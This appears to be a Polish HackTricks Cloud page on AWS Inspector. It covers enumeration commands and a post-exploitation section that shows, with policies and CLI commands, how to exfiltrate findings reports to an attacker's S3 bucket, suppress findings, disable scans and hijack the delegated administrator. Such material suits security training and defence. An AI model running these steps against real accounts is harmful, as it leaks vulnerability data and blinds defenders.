# AWS - Inspector Enum

{% hint style="success" %}
Dowiedz si i wicz Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Dowiedz si i wicz Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na GitHubie.

</details>
{% endhint %}

## Inspector

Amazon Inspector to zaawansowana, zautomatyzowana usuga zarzdzania podatnociami, zaprojektowana w celu zwikszenia bezpieczestwa rodowiska AWS. Usuga ta cigle skanuje instancje Amazon EC2, obrazy kontener贸w w Amazon ECR, usugi Amazon ECS i funkcje AWS Lambda w poszukiwaniu podatnoci i niezamierzonego wystawienia sieci. Korzystajc z rozbudowanej bazy danych inteligencji podatnoci, Amazon Inspector dostarcza szczeg贸owe wyniki, w tym poziomy powagi i zalecenia dotyczce naprawy, pomagajc organizacjom wczesnym identyfikowa i rozwizywa ryzyka zwizane z bezpieczestwem. To kompleksowe podejcie zapewnia umocnion postaw bezpieczestwa w r贸偶nych usugach AWS, wspierajc zgodno i zarzdzanie ryzykiem.

## Kluczowe elementy

### Wyniki

Wyniki w Amazon Inspector to szczeg贸owe raporty dotyczce podatnoci i wystawie odkrytych podczas skanowania instancji EC2, repozytori贸w ECR lub funkcji Lambda. W zale偶noci od swojego stanu, wyniki s kategoryzowane jako:

- **Aktywne**: Wynik nie zosta naprawiony.
- **Zamknite**: Wynik zosta naprawiony.
- **Wyciszony**: Wynik zosta oznaczony tym stanem z powodu jednej lub wicej **regu wyciszenia**.

Wyniki s r贸wnie偶 kategoryzowane w nastpujce trzy typy:

- **Pakiet**: Te wyniki dotycz podatnoci w pakietach oprogramowania zainstalowanych na Twoich zasobach. Przykady to przestarzae biblioteki lub zale偶noci znanymi problemami z bezpieczestwem.
- **Kod**: Ta kategoria obejmuje podatnoci znalezione w kodzie aplikacji dziaajcych na Twoich zasobach AWS. Powszechne problemy to bdy kodowania lub niebezpieczne praktyki, kt贸re mog prowadzi do narusze bezpieczestwa.
- **Sie**: Wyniki sieciowe identyfikuj potencjalne wystawienia w konfiguracjach sieciowych, kt贸re mog by wykorzystane przez atakujcych. Obejmuj one otwarte porty, niebezpieczne protokoy sieciowe i 藕le skonfigurowane grupy zabezpiecze.

### Filtry i Reguy Wyciszenia

Filtry i reguy wyciszenia w Amazon Inspector pomagaj zarzdza i priorytetyzowa wyniki. Filtry pozwalaj na precyzowanie wynik贸w na podstawie okrelonych kryteri贸w, takich jak powaga lub typ zasobu. Reguy wyciszenia pozwalaj wyciszy pewne wyniki uwa偶ane za niskie ryzyko, kt贸re zostay ju偶 za偶egnane lub z innych wa偶nych powod贸w, zapobiegajc przeadowaniu raport贸w zabezpiecze i umo偶liwiajc skupienie si na bardziej krytycznych problemach.

### Lista Materia贸w Oprogramowania (SBOM)

Lista Materia贸w Oprogramowania (SBOM) w Amazon Inspector to eksportowalna zagnie偶d偶ona lista inwentaryzacyjna, kt贸ra szczeg贸owo opisuje wszystkie skadniki w pakiecie oprogramowania, w tym biblioteki i zale偶noci. SBOMy pomagaj zapewni przejrzysto acucha dostaw oprogramowania, umo偶liwiajc lepsze zarzdzanie podatnociami i zgodno. S one kluczowe dla identyfikowania i agodzenia ryzyka zwizanego z oprogramowaniem open source i firm trzecich.

## Kluczowe funkcje

### Eksportowanie wynik贸w

Amazon Inspector oferuje mo偶liwo eksportowania wynik贸w do kubek贸w Amazon S3, Amazon EventBridge i AWS Security Hub, co umo偶liwia generowanie szczeg贸owych raport贸w zidentyfikowanych podatnoci i wystawie do dalszej analizy lub udostpniania w okrelonym terminie. Ta funkcja obsuguje r贸偶ne formaty wyjciowe, takie jak CSV i JSON, uatwiajc integracj z innymi narzdziami i systemami. Funkcjonalno eksportu pozwala na dostosowanie danych zawartych w raportach, umo偶liwiajc filtrowanie wynik贸w na podstawie okrelonych kryteri贸w, takich jak powaga, typ zasobu lub zakres daty, i domylnie uwzgldniajc wszystkie wyniki w bie偶cym regionie AWS z aktywnym statusem.

Podczas eksportowania wynik贸w konieczny jest klucz usugi zarzdzania kluczami (KMS) do szyfrowania danych podczas eksportu. Klucze KMS zapewniaj, 偶e eksportowane wyniki s chronione przed nieautoryzowanym dostpem, zapewniajc dodatkow warstw bezpieczestwa dla wra偶liwych informacji o podatnociach.

### Skanowanie instancji Amazon EC2

Amazon Inspector oferuje rozbudowane mo偶liwoci skanowania instancji Amazon EC2 w celu wykrywania podatnoci i problem贸w zwizanych z bezpieczestwem. Inspector por贸wnuje wyodrbnione metadane z instancji EC2 z reguami z zaleceniami bezpieczestwa, aby wykry podatnoci pakiet贸w i problemy z dostpnoci sieci. Skany te mo偶na przeprowadza za pomoc metod **opartych na agencie** lub **bez agencji**, w zale偶noci od konfiguracji ustawie **trybu skanowania** Twojego konta.

- **Oparte na Agencie**: Wykorzystuje agenta AWS Systems Manager (SSM) do przeprowadzania dogbnych skan贸w. Ta metoda umo偶liwia kompleksowe zbieranie danych i analiz bezporednio z instancji.
- **Bez Agencji**: Zapewnia lekk alternatyw, kt贸ra nie wymaga instalowania agenta na instancji, tworzc migawk EBS ka偶dego woluminu instancji EC2, szukajc podatnoci, a nastpnie usuwajc j; wykorzystujc istniejc infrastruktur AWS do skanowania.

Tryb skanowania okrela, kt贸ra metoda zostanie u偶yta do przeprowadzenia skan贸w EC2:

- **Oparte na Agencie**: Wymaga zainstalowania agenta SSM na instancjach EC2 w celu przeprowadzenia dogbnej inspekcji.
- **Skanowanie Hybrydowe**: czy obie metody, oparte na agencie i bez agencji, w celu maksymalizacji pokrycia i minimalizacji wpywu na wydajno. W instancjach EC2, gdzie zainstalowany jest agent SSM, Inspector przeprowadzi skan oparty na agencie, a dla tych, gdzie nie ma agenta SSM, przeprowadzony skan bdzie bez agencji.

Inn istotn funkcj jest **dogbna inspekcja** instancji EC2 z systemem Linux. Ta funkcja oferuje szczeg贸ow analiz oprogramowania i konfiguracji instancji EC2 z systemem Linux, zapewniajc szczeg贸owe oceny podatnoci, w tym podatnoci systemu operacyjnego, podatnoci aplikacji i bdne konfiguracje, zapewniajc kompleksow ocen bezpieczestwa. Osiga si to poprzez inspekcj **niestandardowych cie偶ek** i wszystkich ich podkatalog贸w. Domylnie Amazon Inspector przeskanuje nastpujce, ale ka偶de konto czonkowskie mo偶e zdefiniowa do 5 dodatkowych niestandardowych cie偶ek, a ka偶dy administrator delegowany do 10:

- `/usr/lib`
- `/usr/lib64`
- `/usr/local/lib`
- `/usr/local/lib64`

### Skanowanie obraz贸w kontener贸w Amazon ECR

Amazon Inspector zapewnia rozbudowane mo偶liwoci skanowania obraz贸w kontener贸w w Amazon Elastic Container Registry (ECR), zapewniajc wykrywanie i efektywne zarzdzanie podatnociami pakiet贸w.

- **Podstawowe Skanowanie**: To szybki i lekki skan, kt贸ry identyfikuje znane podatnoci pakiet贸w systemu operacyjnego w obrazach kontener贸w za pomoc standardowego zestawu regu z projektu open-source Clair. W tej konfiguracji skanowania Twoje repozytoria bd skanowane podczas przesyania lub wykonywania skan贸w rcznych.
- **Rozszerzone Skanowanie**: Ta opcja dodaje funkcj cigego skanowania opr贸cz skanowania podczas przesyania. Rozszerzone skanowanie zagbia si w warstwy ka偶dego obrazu kontenera, aby zidentyfikowa podatnoci w pakietach systemu operacyjnego i pakietach jzyk贸w programowania z wiksz dokadnoci. Analizuje zar贸wno obraz bazowy, jak i dodatkowe warstwy, zapewniajc kompleksowy obraz potencjalnych problem贸w z bezpieczestwem.

### Skanowanie funkcji Lambda Amazon

Amazon Inspector obejmuje kompleksowe mo偶liwoci skanowania funkcji AWS Lambda i jej warstw, zapewniajc bezpieczestwo i integralno aplikacji bezserwerowych. Inspector oferuje dwa rodzaje skanowania dla funkcji Lambda:

- **Standardowe skanowanie Lambda**: Ta domylna funkcja identyfikuje podatnoci oprogramowania w zale偶nociach pakiet贸w aplikacji dodanych do Twojej funkcji Lambda i warstw. Na przykad, jeli Twoja funkcja u偶ywa wersji biblioteki takiej jak python-jwt z znan podatnoci, generuje wynik.
- **Skanowanie kodu Lambda**: Analizuje niestandardowy kod aplikacji pod ktem problem贸w zwizanych z bezpieczestwem, wykrywajc podatnoci takie jak luki wstrzykiwania, wycieki danych, sabe szyfrowanie i brak szyfrowania. Zbiera fragmenty kodu podkrelajce wykryte podatnoci, takie jak zahardcodowane powiadczenia. Wyniki obejmuj szczeg贸owe sugestie naprawy i fragmenty kodu do naprawy problem贸w.
### **Skanowania Center for Internet Security (CIS)**

Amazon Inspector zawiera skanowania CIS do por贸wnywania system贸w operacyjnych instancji Amazon EC2 z zaleceniami najlepszych praktyk od Center for Internet Security (CIS). Te skanowania zapewniaj, 偶e konfiguracje speniaj standardowe podstawy bezpieczestwa bran偶owego.

- **Konfiguracja**: Skanowania CIS oceniaj, czy konfiguracje systemu speniaj konkretne zalecenia CIS Benchmark, przy czym ka偶de sprawdzenie jest powizane z identyfikatorem i tytuem sprawdzenia CIS.
- **Wykonanie**: Skanowania s wykonywane lub zaplanowane na podstawie tag贸w instancji i zdefiniowanych harmonogram贸w.
- **Wyniki**: Wyniki po skanowaniu wskazuj, kt贸re sprawdzenia zostay zaliczone, pominite lub niezaliczone, dostarczajc wgldu w postaw bezpieczestwa ka偶dej instancji.

## Wyliczenie
```bash
# Administrator and member accounts #

## Retrieve information about the AWS Inpsector delegated administrator for your organization (ReadOnlyAccess policy is enough for this)
aws inspector2 get-delegated-admin-account

## List the members who are associated with the AWS Inspector administrator account (ReadOnlyAccess policy is enough for this)
aws inspector2 list-members [--only-associated | --no-only-associated]
## Retrieve information about a member account (ReadOnlyAccess policy is enough for this)
aws inspector2 get-member --account-id <value>
## Retrieve the status of AWS accounts within your environment (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-account-status [--account-ids <value>]
## Retrieve the free trial status for the specified accounts (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-free-trial-info --account-ids <value>
## Retrieve the EC2 Deep Inspection status for the member accounts (Requires to be the delegated administrator)
aws inspector2 batch-get-member-ec2-deep-inspection-status [--account-ids <value>]

## List an account's permissions associated with AWS Inspector
aws inspector2 list-account-permissions

# Findings #

## List a subset of information of the findings for your envionment (ReadOnlyAccess policy is enough for this)
aws inspector2 list-findings
## Retrieve vulnerability intelligence details for the specified findings
aws inspector2 batch-get-finding-details --finding-arns <value>
## List statistical and aggregated finding data (ReadOnlyAccess policy is enough for this)
aws inspector2 list-finding-aggregations --aggregation-type <FINDING_TYPE | PACKAGE | TITLE | REPOSITORY | AMI | AWS_EC2_INSTANCE | AWS_ECR_CONTAINER | IMAGE_LAYER\
| ACCOUNT AWS_LAMBDA_FUNCTION | LAMBDA_LAYER> [--account-ids <value>]
## Retrieve code snippet information about one or more specified code vulnerability findings
aws inspector2 batch-get-code-snippet --finding-arns <value>
## Retrieve the status for the specified findings report (ReadOnlyAccess policy is enough for this)
aws inspector2 get-findings-report-status --report-id <value>

# CIS #

## List CIS scan configurations (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scan-configurations
## List the completed CIS scans (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scans
## Retrieve a report from a completed CIS scan
aws inspector2 get-cis-scan-report --scan-arn <value> [--target-accounts <value>]
## Retrieve details about the specific CIS scan over the specified resource
aws inspector2 get-cis-scan-result-details --account-id <value> --scan-arn <value> --target-resource-id <value>
## List CIS scan results broken down by check
aws inspector2 list-cis-scan-results-aggregated-by-checks --scan-arn <value>
## List CIS scan results broken down by target resource
aws inspector2 list-cis-scan-results-aggregated-by-target-resource --scan-arn <value>

# Configuration #

## Describe AWS Inspector settings for AWS Organization (ReadOnlyAccess policy is enough for this)
aws inspector2 describe-organization-configuration
## Retrieve the configuration settings about EC2 scan and ECR re-scan
aws inspector2 get-configuration
## Retrieve EC2 Deep Inspection configuration associated with your account
aws inspector2 get-ec2-deep-inspection-configuration

# Miscellaneous #

## Retrieve the details of a Software Bill of Materials (SBOM) report
aws inspector2 get-sbom-export --report-id <value>

## Retrieve the coverage details for the specified vulnerabilities
aws inspector2 search-vulnerabilities --filter-criteria <vulnerabilityIds=id1,id2..>

## Retrieve the tags attached to the specified resource
aws inspector2 list-tags-for-resource --resource-arn <value>

## Retrieve the AWS KMS key used to encrypt the specified code snippets
aws inspector2 get-encryption-key --resource-type <AWS_EC2_INSTANCE | AWS_ECR_CONTAINER_IMAGE | AWS_ECR_REPOSITORY | AWS_LAMBDA_FUNCTION> --scan-type <NETWORK | PACKAGE | CODE>

## List the filters associated to your AWS account
aws inspector2 list-filters

## List the types of statistics AWS Inspector can generate (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage
## Retrieve statistical data and about the resources AWS Inspector monitors (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage-statistics

## List the aggregated usage total over the last 30 days
aws inspector2 list-usage-totals [--account-ids <value>]

### INSPECTOR CLASSIC ###

## Assessments info, there is a "describe" action for each one to get more info
aws inspector list-assessment-runs
aws inspector list-assessment-targets
aws inspector list-assessment-templates
aws inspector list-event-subscriptions

## Get findings
aws inspector list-findings

## Get exclusions
aws inspector list-exclusions --assessment-run-arn <arn>

## Rule packages
aws inspector list-rules-packages
```
## Post Eksploatacja

{% hint style="success" %}
Z perspektywy atakujcego, ta usuga mo偶e pom贸c atakujcemu znale藕 podatnoci i nara偶enia sieciowe, kt贸re mog pom贸c mu w skompromitowaniu innych instancji/kontener贸w.

Jednak atakujcy mo偶e tak偶e by zainteresowany zak贸ceniem tej usugi, aby ofiara nie moga zobaczy podatnoci (wszystkich lub konkretnych).
{% endhint %}

### `inspector2:CreateFindingsReport`, `inspector2:CreateSBOMReport`

Atakujcy m贸gby generowa szczeg贸owe raporty dotyczce podatnoci lub listy materia贸w oprogramowania (SBOMs) i wycieka je z Twojego rodowiska AWS. Te informacje mog by wykorzystane do zidentyfikowania konkretnych sabych punkt贸w, przestarzaego oprogramowania lub niebezpiecznych zale偶noci, umo偶liwiajc ukierunkowane ataki.
```bash
# Findings report
aws inspector2 create-findings-report --report-format <CSV | JSON> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--filter-criteria <value>]
# SBOM report
aws inspector2 create-sbom-report --report-format <CYCLONEDX_1_4 | SPDX_2_3> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--resource-filter-criteria <value>]
```
Poni偶szy przykad pokazuje, jak eksfiltrowa wszystkie aktywne wyniki z Amazon Inspector do kontrolowanego przez atakujcego kubeka Amazon S3 z kontrolowanym przez atakujcego kluczem Amazon KMS:

1. **Utw贸rz kubeek Amazon S3** i docz do niego polityk umo偶liwiajc dostp z Amazon Inspector ofiary:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "allow-inspector",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"s3:PutObject",
"s3:PutObjectAcl",
"s3:AbortMultipartUpload"
],
"Resource": "arn:aws:s3:::inspector-findings/*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
},
"ArnLike": {
"aws:SourceArn": "arn:aws:inspector2:us-east-1:<victim-account-id>:report/*"
}
}
}
]
}
```
2. **Utw贸rz klucz Amazon KMS** i docz do niego polityk, aby m贸g by u偶ywany przez Amazon Inspector ofiary:
```json
{
"Version": "2012-10-17",
"Id": "key-policy",
"Statement": [
{
...
},
{
"Sid": "Allow victim Amazon Inspector to use the key",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
}
}
}
]
}
```
3. Wykonaj polecenie **utworzenia raportu z wynikami** i wyciek danych:
```bash
aws --region us-east-1 inspector2 create-findings-report --report-format CSV --s3-destination bucketName=<attacker-bucket-name>,keyPrefix=exfiltration_,kmsKeyArn=arn:aws:kms:us-east-1:123456789012:key/1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f
```
- **Potencjalny wpyw**: Generowanie i wyciek szczeg贸owych raport贸w dotyczcych podatnoci i oprogramowania, uzyskiwanie wgldu w konkretne podatnoci i saboci zwizane z bezpieczestwem.

### `inspector2:CancelFindingsReport`, `inspector2:CancelSbomExport`

Atakujcy m贸gby anulowa generowanie okrelonego raportu z wynikami lub raportu SBOM, uniemo偶liwiajc zespoom ds. bezpieczestwa otrzymywanie aktualnych informacji o podatnociach i zestawach materia贸w do budowy oprogramowania (SBOM), op贸藕niajc wykrywanie i usuwanie problem贸w zwizanych z bezpieczestwem.
```bash
# Cancel findings report generation
aws inspector2 cancel-findings-report --report-id <value>
# Cancel SBOM report generatiom
aws inspector2 cancel-sbom-export --report-id <value>
```
- **Potencjalny wpyw**: Zak贸cenie monitorowania bezpieczestwa i uniemo偶liwienie terminowego wykrywania oraz usuwania problem贸w zwizanych z bezpieczestwem.
### `inspector2:CreateFilter`, `inspector2:UpdateFilter`, `inspector2:DeleteFilter`

Atakujcy posiadajcy te uprawnienia bdzie m贸g manipulowa reguami filtrowania, kt贸re okrelaj, kt贸re podatnoci i problemy zwizane z bezpieczestwem s raportowane lub tumione (jeli **dziaanie** jest ustawione na SUPPRESS, zostanie utworzona regua tumienia). Mo偶e to ukry krytyczne podatnoci przed administratorami bezpieczestwa, uatwiajc wykorzystanie tych saboci bez wykrycia. Poprzez zmian lub usunicie wa偶nych filtr贸w, atakujcy mo偶e r贸wnie偶 generowa szum poprzez zalewanie systemu nieistotnymi wynikami, co utrudnia skuteczne monitorowanie bezpieczestwa i reakcj.
```bash
# Create
aws inspector2 create-filter --action <NONE | SUPPRESS> --filter-criteria <value> --name <value> [--reason <value>]
# Update
aws inspector2 update-filter --filter-arn <value> [--action <NONE | SUPPRESS>] [--filter-criteria <value>] [--reason <value>]
# Delete
aws inspector2 delete-filter --arn <value>
```
- **Potencjalny wpyw**: Ukrycie lub tumienie istotnych podatnoci lub zalewanie systemu nieistotnymi wynikami.

### `inspector2:DisableDelegatedAdminAccount`, (`inspector2:EnableDelegatedAdminAccount` & `organizations:ListDelegatedAdministrators` & `organizations:EnableAWSServiceAccess` & `iam:CreateServiceLinkedRole`)

Atakujcy m贸gby znaczco zak贸ci struktur zarzdzania bezpieczestwem.

- Wyczenie konta admina delegowanego przez atakujcego mogoby uniemo偶liwi zespoowi bezpieczestwa dostp i zarzdzanie ustawieniami oraz raportami Amazon Inspector.
- Wczenie nieautoryzowanego konta admina umo偶liwioby atakujcemu kontrol konfiguracji bezpieczestwa, potencjalnie wyczajc skanowania lub modyfikujc ustawienia w celu ukrycia zoliwych dziaa.

{% hint style="warning" %}

Wymagane jest, aby nieautoryzowane konto byo w tej samej Organizacji co ofiara, aby sta si adminem delegowanym.

Aby nieautoryzowane konto stao si adminem delegowanym, konieczne jest r贸wnie偶, aby po wyczeniu legalnego admina delegowanego, a przed wczeniem nieautoryzowanego konta jako admina delegowanego, legalny administrator musi zosta wyrejestrowany jako admin delegowany z organizacji. Mo偶na to zrobi za pomoc nastpujcej komendy (wymagane uprawnienie **`organizations:DeregisterDelegatedAdministrator`**): **`aws organizations deregister-delegated-administrator --account-id <legit-account-id> --service-principal [inspector2.amazonaws.com](http://inspector2.amazonaws.com/)`**

{% endhint %}
```bash
# Disable
aws inspector2 disable-delegated-admin-account --delegated-admin-account-id <value>
# Enable
aws inspector2 enable-delegated-admin-account --delegated-admin-account-id <value>
```
- **Potencjalny wpyw**: Zak贸cenie zarzdzania bezpieczestwem.

### `inspector2:AssociateMember`, `inspector2:DisassociateMember`

Atakujcy m贸gby manipulowa powizaniami kont czonkowskich w organizacji Amazon Inspector. Poprzez powizywanie nieautoryzowanych kont lub odczanie prawidowych, atakujcy m贸gby kontrolowa, kt贸re konta s uwzgldniane w skanowaniu bezpieczestwa i raportowaniu. Mo偶e to prowadzi do wykluczenia istotnych kont z monitorowania bezpieczestwa, umo偶liwiajc atakujcemu wykorzystanie podatnoci w tych kontach bez wykrycia.

{% hint style="warning" %}

To dziaanie musi zosta wykonane przez administratora delegowanego.

{% endhint %}
```bash
# Associate
aws inspector2 associate-member --account-id <value>
# Disassociate
aws inspector2 disassociate-member --account-id <value>
```
- **Potencjalne skutki**: Wyczenie kluczowych kont z skan贸w bezpieczestwa, umo偶liwiajc niezauwa偶one wykorzystanie podatnoci.

### `inspector2:Disable`, (`inspector2:Enable` & `iam:CreateServiceLinkedRole`)

Atakujcy posiadajcy uprawnienia `inspector2:Disable` m贸gby wyczy skanowanie bezpieczestwa okrelonych typ贸w zasob贸w (EC2, ECR, Lambda, kod Lambda) w okrelonych kontach, pozostawiajc czci rodowiska AWS bez monitorowania i podatne na ataki. Ponadto, posiadajc uprawnienia **`inspector2:Enable`** & **`iam:CreateServiceLinkedRole`**, atakujcy m贸gby ponownie wczy skany selektywnie, aby unikn wykrycia podejrzanych konfiguracji.

{% hint style="warning" %}
To dziaanie musi zosta wykonane przez upowa偶nionego administratora.
{% endhint %}
```bash
# Disable
aws inspector2 disable --account-ids <value> [--resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}>]
# Enable
aws inspector2 enable --resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}> [--account-ids <value>]
```
- **Potencjalny wpyw**: Utworzenie martwych punkt贸w w monitorowaniu bezpieczestwa.

### `inspector2:UpdateOrganizationConfiguration`

Atakujcy posiadajcy to uprawnienie bdzie m贸g aktualizowa konfiguracje dla Twojej organizacji Amazon Inspector, wpywajc na domylne funkcje skanowania wczone dla nowych kont czonkowskich.

{% hint style="warning" %}

Akcja ta musi zosta wykonana przez administratora delegowanego.

{% endhint %}
```bash
aws inspector2 update-organization-configuration --auto-enable <ec2=true|false,ecr=true|false,lambda=true|false,lambdaCode=true|false>
```
- **Potencjalny wpyw**: Zmiana polityk i konfiguracji skanowania bezpieczestwa dla organizacji.

### `inspector2:TagResource`, `inspector2:UntagResource`

Atakujcy m贸gby manipulowa tagami zasob贸w AWS Inspector, kt贸re s kluczowe dla organizacji, ledzenia i automatyzacji ocen bezpieczestwa. Poprzez zmian lub usunicie tag贸w, atakujcy m贸gby potencjalnie ukry podatnoci przed skanowaniem bezpieczestwa, zak贸ci raportowanie zgodnoci i zak贸ci procesy automatycznego usuwania usterek, co prowadzioby do niesprawdzonych problem贸w z bezpieczestwem i naruszonej integralnoci systemu.
```bash
aws inspector2 tag-resource --resource-arn <value> --tags <value>
aws inspector2 untag-resource --resource-arn <value> --tag-keys <value>
```
- **Potencjalny wpyw**: Ukrywanie podatnoci, zak贸cenie raportowania zgodnoci, zak贸cenie automatyzacji bezpieczestwa i zak贸cenie alokacji koszt贸w.

# Odnoniki
- [https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html](https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html)
- [https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html](https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html)


{% hint style="success" %}
Naucz si i praktykuj Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Naucz si i praktykuj Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si trikami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
